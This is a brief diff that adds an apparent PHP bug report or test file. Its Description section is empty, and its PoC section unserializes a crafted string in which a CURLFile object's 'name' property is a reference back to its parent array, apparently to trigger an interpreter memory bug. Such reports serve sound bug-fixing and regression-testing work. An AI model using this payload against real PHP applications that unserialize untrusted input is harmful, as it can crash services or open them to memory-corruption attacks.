@@ -1,0 +1,13 @@
+Description:
+------------
+PoC:
+```
+<?php
+
+$poc = 'a:1:{i:0;O:8:"CURLFile":1:{s:4:"name";R:1;}}';
+unserialize($poc);
+
+?>
+```
+
+
